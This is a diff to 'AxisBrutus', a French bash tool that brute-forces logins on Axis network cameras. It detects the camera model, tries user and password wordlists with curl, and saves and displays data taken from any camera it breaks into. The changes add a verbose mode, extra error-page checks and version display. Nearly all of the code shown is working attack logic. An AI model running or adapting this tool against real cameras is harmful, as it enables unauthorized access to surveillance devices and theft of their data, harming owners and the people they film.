@@ -3,6 +3,14 @@
 # h4ckr213dz@gmail.com
 #
 # CHANGELOG:
+# 2.2 [01.00.2019]:
+#	- Ameliorations:
+#		- Mode verbeux (--verbose, --v) : Possibilité d'affichier plus ou mopins d'infos à l'écran 
+#		- Estimation du temps restants d'après le nombre de combinaisons restantes et la durée des précedentes 
+#	- Correction de bugs : 
+#		- calcul de durée plus précis
+#		- Suppresson des fichiers temporaires locaux
+#
 # 2.1 [31.07.2019]:
 #	- Amelioration : 
 #		- Logging attaques : Un fichier logs est créé afin de logger les actions. Pratique lorsqu'on envoi une grande liste d'adresses ip en parametre.
@@ -31,8 +39,10 @@
 ####################################################################################################################
 ab_auteur='CHORFA Alla-eddine'
 ab_date_creation='25.07.2019'
-ab_date_maj='31.07.2019 17:21'
-ab_ver='2.1'
+ab_date_maj='01.08.2019 16:30'
+ab_date_maj=$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 6)" "$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 7|rev|cut -d ":" -f 2-|rev)
+ab_titre='AxisBrutus'
+ab_ver='2.2'
 ab_contact='h4ckr213dz@gmail.com'
 ab_web='https://github.com/dino213dz/'
 ab_slogan='La plus fine des brutes!'
@@ -44,7 +54,7 @@ dossier_mdps='./cracked'
 mdp_wordlist='./wordlists/axis_mdp.txt'
 users_wordlist='./wordlists/axis_users.txt'
 fichier_mdp_trouve_default="AXIS_~MODELE~-IP_~IP~-INFOS.txt"
-modele_nondetecte='AXIS inconnu inconnue'
+modele_nondetecte='AXIS inconnu inconnu'
 fichier_mdp_trouve=$fichier_mdp_trouve_default
 fichier_logs_defaut='./axisBrutus.log'
 fichier_logs=$fichier_logs_defaut
@@ -102,6 +112,7 @@ echec_404=''
 skipModeleDetect='NON'
 skipGeo='NON'
 checkOnly='NON'
+modeVerbose='NON'
 total_fait=0
 modeles_verifie=''
 urlforced=''
@@ -129,8 +140,8 @@ function fullModeleDetect {
 	
 	for url_possible in ${url_a_verifier[*]}; do	
 		modele_complet=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -k -s "http://$ip_cam$url_possible"  |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)	
-		
-		if [[ "$modele_complet" = "" ]] ||  [[ "$modele_complet" = " " ]] || [[ -z "${modele_complet##*Index*}" ]] || [[ -z "${modele_complet##*Unauthorized*}" ]] ||   [[ -z "${modele_complet##*Not*}" ]]  ||  [[ -z "${modele_complet##*page*}" ]] ;then
+				
+		if [[ "$modele_complet" = "" ]] ||  [[ "$modele_complet" = " " ]] || [[ -z "${modele_complet##*Bad*}" ]] || [[ -z "${modele_complet##*Index*}" ]] || [[ -z "${modele_complet##*Unauthorized*}" ]] ||   [[ -z "${modele_complet##*Not*}" ]]  ||  [[ -z "${modele_complet##*page*}" ]] ;then
 			modele_complet=$modele_nondetecte
 			continue
 		else 
@@ -150,7 +161,7 @@ function checkUrlProtegee {
 	url_checker_p=$1	
 	test_url_p=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_p|grep -i '401 ')
 	if [ ${#test_url_p} -gt 0 ];then
-		protegee='OUI'$test_url_p"/"$url_checker_p
+		protegee='OUI'
 	else
 		protegee="NON"
 	fi
@@ -163,7 +174,7 @@ function checkUrlExiste {
 	url_checker_e=$1	
 	test_url_e=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_e|grep -i '404 ')
 	if [ ${#test_url_e} -gt 0 ];then
-		existe="NON"$test_url_e"/"$url_checker_e" {$curl_timeout}"
+		existe="NON"
 	else
 		existe='OUI'
 	fi
@@ -212,10 +223,12 @@ function urlModele {
 	#if [ "$modele_cam" = "P3367" ] ;then 
 	#	url_cam="http://$ip_cam/operator/videostream.shtml?id=1312"
 	#fi
-
+	
+		
 	# Page introuvable
-	if [ "$modele_cam" = "N/A" ] || [[ "$modele_cam" =~ "inconnu" ]] || [[ "$modele_cam" = "" ]];then 
+	if [[ "$modele_cam" =~ "N/A" ]] || [[ "$modele_cam" =~ "inconnu" ]] || [[ "$modele_cam" = "" ]] || [[ "$modele_cam" = " " ]];then 
 		url_tester_aleatoirement=( "/operator/basic.shtml" "/admin/admin.shtml" "/admin/users.shtml" "/view/indexFrame.shtml" "" )
+		#echo $url_tester_aleatoirement
 		test_url_existe='NON'
 		test_url_protect='NON'
 		for url_de_test in ${url_tester_aleatoirement[*]} ;do
@@ -223,7 +236,7 @@ function urlModele {
 			test_url_existe=$(checkUrlExiste $url_cam)
 			if [ "$test_url_existe" = 'OUI' ];then
 				test_url_protect=$(checkUrlProtegee $url_cam)
-				if [ "$test_url_protect" = 'OUI' ];then
+				if [[ "$test_url_protect" =~ 'OUI' ]];then
 					break
 				fi
 			fi
@@ -446,6 +459,10 @@ for no_arg in $(seq 0 $nb_args); do
 		if [ "$valeur" = "--log" ] ;then
 			fichier_logs=${args[$(($no_arg+1))]}
 		fi
+		#mode verbeux
+		if [ "$valeur" = "--verbose" ] || [ "$valeur" = "-v" ] ;then
+			modeVerbose='OUI'
+		fi
 		#parametres optionnels informatifs/pas d'attaques/quitte apres avoir executé l'option
 
 		#lister les modeles testés
@@ -458,6 +475,7 @@ for no_arg in $(seq 0 $nb_args); do
 		fi
 		#affichage aide 
 		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
+			echo -e "$ab_titre \t-\t Ver. $ab_ver du $ab_date_maj"
 			afficherAide
 			exit
 		fi
@@ -473,7 +491,7 @@ fi
 #Si aucun cible n'est precisée : on quite en affichant un message d'erreur
 if [ ${#ip} -eq 0 ];then
 	echo -e "ERREUR!"
-	echo -e " Vous devez specifier une cible avec l'argument '--cible ou -c'.\nExemple: $0 --cible 127.18.27.33"
+	echo -e " Vous devez specifier une cible avec l'argument '--cible ou -c'.\nExemple: $0 --cible 127.45.63.89"
 	echo -e " Vous pouvez afficher l'aide avec l'argument '--help' ou '-h'."
 	exit
 fi
@@ -722,7 +740,8 @@ if [ "$checkOnly" != "OUI" ];then
 
 			
 			#avancement:
-			echo -en "$jaune[$bleu_fonce$ip$jaune] [$magenta$total_fait_txt$jaune/$magenta_fonce$nb_combinaisons$jaune] [$vert_fonce$progression_pourcent_txt%$jaune] $user $jaune_fonce&$jaune $mdp : "
+			ligne_a_afficher="$jaune[$bleu_fonce$ip$jaune] [$magenta$total_fait_txt$jaune/$magenta_fonce$nb_combinaisons$jaune] [$vert_fonce$progression_pourcent_txt%$jaune] $user $jaune_fonce&$jaune $mdp : "
+			echo -en "$ligne_a_afficher"
 			
 			#Requete HTTP
 			curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
@@ -738,7 +757,9 @@ if [ "$checkOnly" != "OUI" ];then
 			#echo "@test_administration@=$test_administration"
 			test_configuration=$(cat $tmp |egrep --binary-files=text -i 'Basic Configuration')
 			#echo "@test_configuration@=$test_configuration"
-			test_page404=$(cat $tmp |egrep --binary-files=text -i '<TITLE>404 Not Found')
+			test_page400=$(cat $tmp |egrep --binary-files=text -i '<TITLE>400 ')
+			test_page404=$(cat $tmp |egrep --binary-files=text -i '<TITLE>404 ')
+			test_page500=$(cat $tmp |egrep --binary-files=text -i '<TITLE>500 ')
 			#echo "@test_page404@=$test_page404"
 			test_presence_lien_admin=$(cat $tmp |egrep --binary-files=text -i '/admin/users.shtml') #utile dans les cas javascript
 			#echo "@test_presence_lien_admin@=$test_presence_lien_admin"
@@ -746,6 +767,9 @@ if [ "$checkOnly" != "OUI" ];then
 			#si le titre contien "unhotorized"
 			if [ ${#test_unauthorized} -gt 0 ];then
 				echo -e $rouge$msg_echec
+				if [ "$modeVerbose" != 'OUI' ];then
+					tput cuu1;tput el
+				fi
 			else			
 				#sinon on a administration dans le titre de la page alors considere qu'on a passé la porte :D
 				if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
@@ -761,6 +785,9 @@ if [ "$checkOnly" != "OUI" ];then
 							break
 						else
 							echo -e "$rouge$msg_echec: Necessite Javascript. Verifiez cette combinaison manuellement pour vérifier svp"
+							if [ "$modeVerbose" != 'OUI' ];then
+								tput cuu1;tput el
+							fi
 							echec_js="OUI"
 							#echo -e $bleu;cat $tmp;echo -e $reset
 							#break
@@ -769,8 +796,12 @@ if [ "$checkOnly" != "OUI" ];then
 						
 					else
 						#si page 404
-						if [ ${#test_page404} -gt 0 ];then
+						if [ ${#test_page400} -gt 0 ] || [ ${#test_page404} -gt 0 ] || [ ${#test_page500} -gt 0 ];then
+														
 							echo -e "$rouge$msg_echec: Page introuvable. Forcez l'URL avec l'argument \"--url /admin/users.shtml\" $jaune_fonce:/"
+							if [ "$modeVerbose" != 'OUI' ];then
+								tput cuu1;tput el
+							fi
 							echec_404="OUI"
 							break
 						#sinon ok?
@@ -895,10 +926,11 @@ if [ "$mdp_trouve" = "OUI" ]; then
 		
 		#affichage a l'ecran
 		echo -e "$jaune[+] FICHIER:$cyan $fichier_x:"
-		echo -e "$vert--------------------------------------------------------------$italic$vert_fonce"
-		cat $temp_vole
-		echo -e "$vert--------------------------------------------------------------$reset"
-		
+		if [ "$modeVerbose" = 'OUI' ]; then
+			echo -e "$vert--------------------------------------------------------------$italic$vert_fonce"
+			cat $temp_vole
+			echo -e "$vert--------------------------------------------------------------$reset"
+		fi
 		#export
 		export_donnes=$export_donnes"\n$fichier_x:"
 		export_donnes=$export_donnes"\n--------------------------------------------------------------"
